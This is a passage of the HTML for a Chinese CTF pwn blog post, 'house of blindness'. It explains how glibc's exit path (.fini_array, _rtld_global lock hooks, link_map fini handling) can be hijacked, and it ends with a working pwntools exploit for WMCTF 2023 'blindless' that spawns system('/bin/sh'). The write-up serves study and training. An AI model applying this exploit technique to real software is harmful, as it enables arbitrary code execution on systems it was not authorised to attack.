@@ -1,0 +1,741 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon/icon.jpg">
+  <link rel="icon" href="/img/favicon/icon.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Eurus">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="pwn手坐大牢的wm&#x2F;(ㄒoㄒ)&#x2F;~~乖乖来复现了，这题比赛的时候二十几解死活做不出来就很难受 ps：真的是house太多了买不起……">
+<meta property="og:type" content="article">
+<meta property="og:title" content="house of blindness">
+<meta property="og:url" content="http://akaieurus.github.io/2023/08/23/house-of-blindness/index.html">
+<meta property="og:site_name" content="Eurus禁止摆烂！">
+<meta property="og:description" content="pwn手坐大牢的wm&#x2F;(ㄒoㄒ)&#x2F;~~乖乖来复现了，这题比赛的时候二十几解死活做不出来就很难受 ps：真的是house太多了买不起……">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://akaieurus.github.io/img/posts/pc12.jpg">
+<meta property="article:published_time" content="2023-08-23T07:25:53.000Z">
+<meta property="article:modified_time" content="2025-01-03T10:50:47.291Z">
+<meta property="article:author" content="Eurus">
+<meta property="article:tag" content="exit">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://akaieurus.github.io/img/posts/pc12.jpg">
+  
+  
+  
+  <title>house of blindness - Eurus禁止摆烂！</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"akaieurus.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Eurus&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/posts/pc12.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="house of blindness"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-23 15:25" pubdate>
+          2023年8月23日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          10 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">house of blindness</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>pwn手坐大牢的wm&#x2F;(ㄒoㄒ)&#x2F;~~乖乖来复现了，这题比赛的时候二十几解死活做不出来就很难受</p>
+<p>ps：真的是house太多了买不起……</p>
+<span id="more"></span>
+
+<h1 id="其他的exit利用方法"><a href="#其他的exit利用方法" class="headerlink" title="其他的exit利用方法"></a>其他的exit利用方法</h1><h2 id="更改-fini-array"><a href="#更改-fini-array" class="headerlink" title="更改.fini_array"></a>更改.fini_array</h2><p>elf文件中会存在一个.fini_array段</p>
+<img src="/2023/08/23/house-of-blindness/fini.png" srcset="/img/loading.gif" lazyload class title="fini">
+
+<p>在exit的时候会调用__do_global_dtors_aux_fini_array_entry指向的函数__do_global_dtors_aux</p>
+<p>所以可以更改__do_global_dtors_aux_fini_array_entry的内容为system(‘&#x2F;bin&#x2F;sh’)，之前见过一道用这种方法进行循环执行的题（但只能循环一次）</p>
+<h2 id="rtld-lock-unlock-recursive劫持"><a href="#rtld-lock-unlock-recursive劫持" class="headerlink" title="__rtld_lock_unlock_recursive劫持"></a>__rtld_lock_unlock_recursive劫持</h2><p>exit的时候存在调用流程</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">exit</span>-&gt;__run_exit_handlers-&gt;_dl_fini-&gt;_rtld_global._dl_rtld_lock_recursive<br>								-&gt;_rtld_global._dl_rtld_unlock_recursive<br></code></pre></td></tr></table></figure>
+
+<p>所以可以更改_rtld_global的_dl_rtld_unlock_recursive成员或者_dl_rtld_lock_recursive成员为system地址或者one_gadget地址</p>
+<p>调用_rtld_global._dl_rtld_lock_recursive时的参数rdi是_rtld_global._dl_load_lock.mutex，可以改为&#x2F;bin&#x2F;sh</p>
+
+
+<img src="/2023/08/23/house-of-blindness/mutex.png" srcset="/img/loading.gif" lazyload class title="mutex">
+
+<p>这道题也可以更改_rtld_global，但ld中的_rtld_global和libc中的system距离太远，存在一个4096的爆破，这概率对于我这种非酋来说等于0(╯‵□′)╯︵┻━┻</p>
+<h1 id="house-of-blindness"><a href="#house-of-blindness" class="headerlink" title="house of blindness"></a>house of blindness</h1><p>先让我们来探究一下exit的流程，比如它到底是怎么调用.fini_array的</p>
+<h2 id="exit调用-fini-array流程"><a href="#exit调用-fini-array流程" class="headerlink" title="exit调用.fini_array流程"></a>exit调用.fini_array流程</h2><ul>
+<li><p>exit函数直接调用__run_exit_handlers</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br><span class="hljs-title function_">exit</span> <span class="hljs-params">(<span class="hljs-type">int</span> status)</span><br>&#123;<br>  __run_exit_handlers (status, &amp;__exit_funcs, <span class="hljs-literal">true</span>, <span class="hljs-literal">true</span>);<br>&#125;<br>libc_hidden_def (<span class="hljs-built_in">exit</span>)<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>exit传给__run_exit_handlers的__exit_funcs指向initial</p>
+<img src="/2023/08/23/house-of-blindness/handlers.png" srcset="/img/loading.gif" lazyload class title="handlers">
+
+<img src="/2023/08/23/house-of-blindness/initial.png" srcset="/img/loading.gif" lazyload class title="initial">
+
+<p>接下来__run_exit_handlers会遍历initial的fns数组，当flavor&#x3D;&#x3D;ef_cxa（4）时会解密f-&gt;func.cxa.fn指针并调用这个函数，就是_dl_fini</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span></span><br><span class="hljs-class">&#123;</span><br>  ef_free,	<span class="hljs-comment">/* `ef_free&#x27; MUST be zero!  */</span><br>  ef_us,<br>  ef_on,<br>  ef_at,<br>  ef_cxa<br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<p>ps：我当时想过这里能不能利用，但发现这个加密后就放弃了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">	    <span class="hljs-keyword">case</span> ef_cxa:<br>	      <span class="hljs-comment">/* To avoid dlclose/exit race calling cxafct twice (BZ 22180),</span><br><span class="hljs-comment">		 we must mark this function as ef_free.  */</span><br>	      f-&gt;flavor = ef_free;<br>	      cxafct = f-&gt;func.cxa.fn;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> PTR_DEMANGLE</span><br>	      PTR_DEMANGLE (cxafct);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>	      cxafct (f-&gt;func.cxa.arg, status);<br>	      <span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure>
+
+<p>这个加密的数据来自fs:[0x30]，和canary差不多</p>
+</li>
+<li><p>_dl_fini中调用_dl_rtld_lock_recursive和_dl_rtld_unlock_recursive的地方就是这里</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">      <span class="hljs-comment">/* Protect against concurrent loads and unloads.  */</span><br>      __rtld_lock_lock_recursive (GL(dl_load_lock));<br><br>      <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nloaded = GL(dl_ns)[ns]._ns_nloaded;<br>      <span class="hljs-comment">/* No need to do anything for empty namespaces or those used for</span><br><span class="hljs-comment">	 auditing DSOs.  */</span><br>      <span class="hljs-keyword">if</span> (nloaded == <span class="hljs-number">0</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> SHARED</span><br>	  || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>	  )<br>	__rtld_lock_unlock_recursive (GL(dl_load_lock));<br></code></pre></td></tr></table></figure>
+
+<p>这里还有一个地址跳转</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> (i-- &gt; <span class="hljs-number">0</span>)<br>	((<span class="hljs-type">fini_t</span>) <span class="hljs-built_in">array</span>[i]) ();<br></code></pre></td></tr></table></figure>
+
+<p>这个就是调用.fini_array的地方</p>
+</li>
+</ul>
+<p>细看一下调用这个地址跳转的过程（link_map结构体介绍见ret2dlresolve）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs c">	  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">maps</span>[<span class="hljs-title">nloaded</span>];</span><br><br>	  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i;<br>	  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">l</span>;</span><br>	  assert (nloaded != <span class="hljs-number">0</span> || GL(dl_ns)[ns]._ns_loaded == <span class="hljs-literal">NULL</span>);<br><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * 遍历_rtld_global中的所有link_map，放入maps</span><br><span class="hljs-comment"> * link_map的遍历是按照_rtld_global[i]-&gt;_ns_loaded来的，这个成员的类型是一个link_map指针</span><br><span class="hljs-comment"> * struct rtld_global</span><br><span class="hljs-comment"> * &#123;</span><br><span class="hljs-comment"> *   EXTERN struct link_namespaces</span><br><span class="hljs-comment"> *   &#123;</span><br><span class="hljs-comment"> *     struct link_map *_ns_loaded;</span><br><span class="hljs-comment"> *     unsigned int _ns_nloaded;</span><br><span class="hljs-comment"> *     	……</span><br><span class="hljs-comment"> */</span><br>	  <span class="hljs-keyword">for</span> (l = GL(dl_ns)[ns]._ns_loaded, i = <span class="hljs-number">0</span>; l != <span class="hljs-literal">NULL</span>; l = l-&gt;l_next)<br>	    <span class="hljs-keyword">if</span> (l == l-&gt;l_real)<br>	      &#123;<br>		assert (i &lt; nloaded);<br><br>		maps[i] = l;<br>		l-&gt;l_idx = i;<br>		++i;<br>		++l-&gt;l_direct_opencount;<br>	      &#125;<br>	  assert (ns != LM_ID_BASE || i == nloaded);<br>	  assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class="hljs-number">1</span>);<br>	  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nmaps = i;<br><br><span class="hljs-comment">/* 排序maps中的结构 */</span><br>	  _dl_sort_maps (maps + (ns == LM_ID_BASE), nmaps - (ns == LM_ID_BASE),<br>			 <span class="hljs-literal">NULL</span>, <span class="hljs-literal">true</span>);<br>		……<br><br>	  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; nmaps; ++i)<br>	    &#123;<br>	      <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">l</span> =</span> maps[i];<br><br>	      <span class="hljs-keyword">if</span> (l-&gt;l_init_called)<br>		&#123;<br>		  <span class="hljs-comment">/* 确保只能调用一次  */</span><br>		  l-&gt;l_init_called = <span class="hljs-number">0</span>;<br><br>		  <span class="hljs-comment">/* 确保.fini_array段或fini函数段描述符不为空 */</span><br>		  <span class="hljs-keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="hljs-literal">NULL</span><br>		      || l-&gt;l_info[DT_FINI] != <span class="hljs-literal">NULL</span>)<br>		    &#123;<br>              <br>		     	……<br>                    <br>           <span class="hljs-comment">/* 如果.fini_array段不为空，则使用.fini_array的指针调用fini函数 */</span><br>		      <span class="hljs-keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="hljs-literal">NULL</span>)<br>			&#123;<br>               <span class="hljs-comment">/* 使用基址（l-&gt;l_addr）和偏移（d_un.d_ptr）计算.fini_array地址 */</span><br>			  ElfW(Addr) *<span class="hljs-built_in">array</span> =<br>			    (ElfW(Addr) *) (l-&gt;l_addr<br>					    + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);<br>			  <span class="hljs-comment">/* 计算.fini_array段大小且令其=i */</span>                  <br>			  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val<br>					    / <span class="hljs-keyword">sizeof</span> (ElfW(Addr)));<br>			  <span class="hljs-keyword">while</span> (i-- &gt; <span class="hljs-number">0</span>)	<span class="hljs-comment">// 调用fini函数</span><br>			    ((<span class="hljs-type">fini_t</span>) <span class="hljs-built_in">array</span>[i]) ();<br>			&#125;<br>              <br>             <span class="hljs-comment">/* 如果.fini_array段为空，则直接调用fini函数 */</span><br>		      <span class="hljs-keyword">if</span> (l-&gt;l_info[DT_FINI] != <span class="hljs-literal">NULL</span>)<br>			DL_CALL_DT_FINI<br>			  (l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);<br>		    &#125;<br>              <br>			……<br></code></pre></td></tr></table></figure>
+
+<h2 id="例题：WMCTF-2023-blindless"><a href="#例题：WMCTF-2023-blindless" class="headerlink" title="例题：WMCTF - 2023 - blindless"></a>例题：WMCTF - 2023 - blindless</h2><p>利用的就是.fini_array段为空，则直接调用fini函数的分支</p>
+<p>根据hint，我们可以申请一个大的data chunk（大于0x100000），这样就会调用mmap分配堆块，分配的堆块就在libc下方，libc和ld的相对地址是固定的，就可以通过越界写更改</p>
+<p>我们可以更改elf的link_map（在ld里）</p>
+<ul>
+<li>更改_rtld_global._dl_load_lock.mutex为&#x2F;bin&#x2F;sh</li>
+<li>更改l_addr为.init和system的plt的差值</li>
+<li>更改l_info[DT_FINI]为l_info[DT_INIT]的值</li>
+<li>更改l_info[DT_FINI_ARRAY]的值为0</li>
+</ul>
+<p><em><strong>为什么要这么构造？</strong></em></p>
+<ul>
+<li><p>.fini段的地址是0x1558，backdoor和system的plt的地址都在它之下，但改l_addr只能往后改不能往前改，所以要使l_info[DT_FINI]指向一个靠前的地址，这里我选则了l_info[DT_INIT]（0x1000）</p>
+</li>
+<li><p>使用system(‘&#x2F;bin&#x2F;sh’)而不是调用backdoor是因为</p>
+<ul>
+<li>system的plt和.init的差值为0xe0</li>
+<li>backdoor和.init的差值为0x209</li>
+</ul>
+<p>如果要使用backdoor就要改两字节，涉及一个1&#x2F;16的爆破，对我来说爆破能没有最好没有：）</p>
+</li>
+</ul>
+<h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">offset, value</span>):<br>    code = <span class="hljs-string">b&#x27;&#x27;</span><br>    code += <span class="hljs-string">b&#x27;@&#x27;</span><br>    code += p32(offset)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> value:<br>        code += <span class="hljs-string">b&#x27;.&#x27;</span><br>        code += p8(i)<br>        code += <span class="hljs-string">b&#x27;&gt;&#x27;</span><br>    <span class="hljs-keyword">return</span> code<br><br>p = process(<span class="hljs-string">&#x27;./main&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Pls input the data size\n&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x100000</span>).encode())<br>code = write(<span class="hljs-number">0x325958</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>code += write(<span class="hljs-number">0x326180</span>-<span class="hljs-number">0x325958</span>-<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\xe0&#x27;</span>)<br>code += write(<span class="hljs-number">0x326228</span>-<span class="hljs-number">0x326180</span>-<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;\x10&#x27;</span>)<br>code += write(<span class="hljs-number">0x326290</span>-<span class="hljs-number">0x326228</span>-<span class="hljs-number">1</span>,p64(<span class="hljs-number">0</span>))<br>p.sendlineafter(<span class="hljs-string">b&#x27;Pls input the code size\n&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(code)+<span class="hljs-number">1</span>).encode())<br><span class="hljs-comment">#gdb.attach(p)</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;Pls input your code\n&#x27;</span>, code+<span class="hljs-string">b&#x27;q&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF/Pwn/" class="category-chain-item">Pwn</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF/Pwn/Stack/" class="category-chain-item">Stack</a>
+  
+  
+
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/exit/" class="print-no-link">#exit</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>house of blindness</div>
+      <div>http://akaieurus.github.io/2023/08/23/house-of-blindness/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Eurus</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年8月23日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/10/02/LLVM-IR%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/" title="LLVM IR数据结构分析">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">LLVM IR数据结构分析</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/08/20/kernel-heap-heap-overflow/" title="Kernel Heap Heap-Overflow">
+                        <span class="hidden-mobile">Kernel Heap Heap-Overflow</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
